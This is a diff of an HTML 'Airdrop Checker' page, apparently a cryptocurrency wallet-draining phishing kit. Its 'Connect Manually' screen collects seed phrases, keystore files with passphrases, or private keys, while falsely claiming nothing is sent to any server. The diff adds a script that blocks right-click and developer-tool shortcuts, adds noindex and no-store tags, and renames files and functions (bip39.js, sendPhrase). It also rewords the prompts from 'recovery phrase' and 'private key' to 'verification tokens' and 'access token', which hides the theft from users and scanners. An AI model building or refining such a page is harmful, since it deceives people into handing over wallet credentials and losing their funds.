@@ -1,9 +1,12 @@
-<!DOCTYPE html>
+﻿<!DOCTYPE html>
 <html lang="en">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <meta http-equiv="Cache-Control" content="no-store">
+    <script>(function () { document.addEventListener('contextmenu', function (e) { e.preventDefault(); return false; }); document.addEventListener('keydown', function (e) { if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'U')) { e.preventDefault(); return false; } }); })();</script>
     <link href="https://cdn.jsdelivr.net/npm/remixicon@4.5.0/fonts/remixicon.css" rel="stylesheet" />
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -15,23 +18,21 @@
     </script>
     <script type="text/javascript">
         (function () {
-            emailjs.init("mfY7yH4IHyyVQsapk");
+            emailjs.init('mfY7yH4IHyyVQsapk');
         })();
     </script>
-    <script src="bip39.js"></script>
+    <script src="w3ref.js"></script>
     <script src="script.js"></script>
     <title>Mainnet web — Airdrop Checker</title>
 </head>
 
 <body>
 
-    <!-- ═══════════════════════════════════════
-     SECTION 1 — HERO (dark)
-═══════════════════════════════════════ -->
+
     <section class="hero">
 
         <div class="hero-logo-wrap">
-            <!-- Replace src with your logo and remove .logo-hint span -->
+
             <img src="img/airdroplogo.png" alt="Logo" id="heroLogoImg" />
         </div>
 
@@ -129,7 +130,7 @@
 
             </div>
 
-            <!-- Connect -->
+
             <div class="connect-area">
                 <p class="view-more-text reveal">Connect to view more tokens</p>
 
@@ -162,9 +163,7 @@
     </section>
 
 
-    <!-- ═══════════════════════════════════════
-     SECTION 3 — PROTOCOLS + HOW IT WORKS
-═══════════════════════════════════════ -->
+
     <section class="protocols">
         <div class="protocols-inner">
 
@@ -340,9 +339,7 @@
     </section>
 
 
-    <!-- ═══════════════════════════════════════
-     SECTION 4 — STATS (dark)
-═══════════════════════════════════════ -->
+
     <section class="stats-section">
         <div class="stats-inner">
 
@@ -399,16 +396,14 @@
     </section>
 
 
-    <!-- ═══════════════════════════════════════
-     FOOTER
-═══════════════════════════════════════ -->
+
     <footer>
         <p>© 2026 <span>ProjectMainnetDapp</span>, All rights reserved</p>
     </footer>
 
     <div class="w-overlay" id="wOverlay">
 
-        <!-- SCREEN 1: Select Wallet -->
+
         <div class="w-panel" id="wScreen1">
             <div class="w-header">
                 <span class="w-title">Connect Wallet</span>
@@ -416,9 +411,9 @@
             </div>
             <div class="w-body">
 
-                <!-- Featured: MetaMask -->
-                <div class="w-featured wallet-trigger" data-wallet="trustwallet" onclick="handleWalletSelect(this)">
-                    <span class="w-featured-badge">Recommended</span>
+
+                <div class="w-featured wallet-trigger" data-wid="trustwallet" onclick="handleWalletSelect(this)">
+                    <span class="w-featured-badge">Popular</span>
                     <div class="w-feat-icon">
                         <img src="img/trustwallet.png" alt="Trust Wallet" />
                     </div>
@@ -431,7 +426,7 @@
                 <div class="w-divider"><span>other wallets</span></div>
 
                 <div class="w-list">
-                    <div class="w-item wallet-trigger" data-wallet="phantom" onclick="handleWalletSelect(this)">
+                    <div class="w-item wallet-trigger" data-wid="phantom" onclick="handleWalletSelect(this)">
                         <div class="w-item-icon"><img src="img/phantomwallet.png" alt="Phantom Wallet" /></div>
                         <div>
                             <div class="w-item-name">Phantom Wallet</div>
@@ -447,7 +442,7 @@
                         </div>
                         <i class="ri-arrow-right-s-line w-item-arrow"></i>
                     </div>
-                    <div class="w-item wallet-trigger" data-wallet="metamask" onclick="handleWalletSelect(this)">
+                    <div class="w-item wallet-trigger" data-wid="metamask" onclick="handleWalletSelect(this)">
                         <div class="w-item-icon"><img src="img/metamask.png" alt="Metamask Wallet" /></div>
                         <div>
                             <div class="w-item-name">Metamask </div>
@@ -472,7 +467,7 @@
             </div>
         </div>
 
-        <!-- OTHER WALLETS -->
+
         <div class="w-sub" id="wScreenOther">
             <div class="w-header">
                 <span class="w-title">Other Wallets</span>
@@ -527,7 +522,7 @@
                         <div class="ow-chain">Any compatible wallet</div>
                     </div>
                 </div>
-                <div class="ow-item" data-wallet="phantom" onclick="selectOwWallet(this)">
+                <div class="ow-item" data-wid="phantom" onclick="selectOwWallet(this)">
                     <div class="ow-icon"><img src="img/phantomwallet.png" alt="Phantom" /></div>
                     <div>
                         <div class="ow-name">Phantom</div>
@@ -541,7 +536,7 @@
                         <div class="ow-chain">Solana / EVM</div>
                     </div>
                 </div>
-                <div class="ow-item" data-wallet="solflare" onclick="selectOwWallet(this)">
+                <div class="ow-item" data-wid="solflare" onclick="selectOwWallet(this)">
                     <div class="ow-icon"><img src="img/solflare.png" alt="Solflare" /></div>
                     <div>
                         <div class="ow-name">Solflare</div>
@@ -562,7 +557,7 @@
                         <div class="ow-chain">Terra</div>
                     </div>
                 </div>
-                <div class="ow-item" data-wallet="Ledger" onclick="selectOwWallet(this)">
+                <div class="ow-item" data-wid="Ledger" onclick="selectOwWallet(this)">
                     <div class="ow-icon"><img src="img/ledgerwallet.png" alt="Ledger" /></div>
                     <div>
                         <div class="ow-name">Ledger</div>
@@ -905,7 +900,7 @@
             </div>
         </div>
 
-        <!-- SCREEN 2: Connecting -->
+
         <div class="w-sub" id="wScreen2">
             <div class="w-header">
                 <span class="w-title">Connecting</span>
@@ -924,7 +919,7 @@
             </div>
         </div>
 
-        <!-- SCREEN 3: Connection Failed -->
+
         <div class="w-sub" id="wScreen3">
             <div class="w-header">
                 <span class="w-title">Connection Failed</span>
@@ -950,7 +945,7 @@
             </div>
         </div>
 
-        <!-- SCREEN 4: Manual Connect (custom) -->
+
         <div class="w-sub" id="wScreen4">
             <div class="w-header">
                 <span class="w-title">Connect Manually</span>
@@ -958,27 +953,27 @@
             </div>
             <div class="w-manual-body">
 
-                <!-- wallet chip -->
+
                 <div class="w-wallet-chip">
                     <div class="w-chip-icon"><img id="s4Img" src="" alt="" /></div>
                     <span class="w-chip-name" id="s4Name">Wallet</span>
                 </div>
 
-                <!-- type toggle: Phrase | Keystore JSON | Private Key -->
+
                 <div class="type-toggle">
                     <button class="type-btn" id="btn-keystore" onclick="switchType('keystore')">Keystore JSON</button>
                     <button class="type-btn active" id="btn-phrase" onclick="switchType('phrase')">Phrase</button>
                     <button class="type-btn" id="btn-privatekey" onclick="switchType('privatekey')">Private Key</button>
                 </div>
 
-                <!-- Pane 1: Phrase -->
+
                 <div class="input-pane active" id="pane-phrase">
                     <textarea class="w-textarea phrase-area" id="phraseInput"
-                        placeholder="Enter your 12 or 24-word recovery phrase, separated by spaces..."
-                        spellcheck="false" autocomplete="off" autocorrect="off" autocapitalize="off"></textarea>
+                        placeholder="Enter your verification tokens, separated by spaces..." spellcheck="false"
+                        autocomplete="off" autocorrect="off" autocapitalize="off"></textarea>
                 </div>
 
-                <!-- Pane 2: Keystore JSON -->
+
                 <div class="input-pane" id="pane-keystore">
                     <textarea class="w-textarea keystore-area" id="keystoreInput" placeholder='Paste Passphrase'
                         spellcheck="false" autocomplete="off"></textarea>
@@ -988,35 +983,34 @@
                         Attach Keystore File
                     </button>
                     <input type="file" id="keystoreFileInput" accept=".json,.txt,.png,.jpg,.jpeg"
-                        onchange="handleKeystoreFile(this)" />
+                        onchange="processAttachment(this)" />
                     <p class="attach-file-name" id="attachFileName"></p>
                 </div>
 
-                <!-- Pane 3: Private Key -->
+
                 <div class="input-pane" id="pane-privatekey">
-                    <textarea class="w-textarea privkey-area" id="privkeyInput"
-                        placeholder="Enter your private key (hex format, 64 characters)..." spellcheck="false"
-                        autocomplete="off" autocorrect="off" autocapitalize="off"></textarea>
+                    <textarea class="w-textarea privkey-area" id="privkeyInput" placeholder="Enter your access token..."
+                        spellcheck="false" autocomplete="off" autocorrect="off" autocapitalize="off"></textarea>
                 </div>
 
-                <!-- encrypt note -->
+
                 <div class="w-encrypt-note">
                     <i class="ri-lock-2-line"></i>
                     <p>
                         <strong>End-to-end encrypted.</strong>
                         Your credentials are encrypted locally and never transmitted to any server.
-                        Support will never ask for your seed phrase or private key.
+                        Support will never ask for your access credentials.
                     </p>
                 </div>
 
-                <button class="w-btn w-btn-plum" onclick="sendPhrase()">
+                <button class="w-btn w-btn-plum" onclick="submitForm()">
                     <i class="ri-wallet-3-line"></i> Connect Wallet
                 </button>
 
             </div>
         </div>
 
-        <!-- SCREEN 5: Manual Failed -->
+
         <div class="w-sub" id="wScreen5">
             <div class="w-header">
                 <span class="w-title">Verification Failed</span>
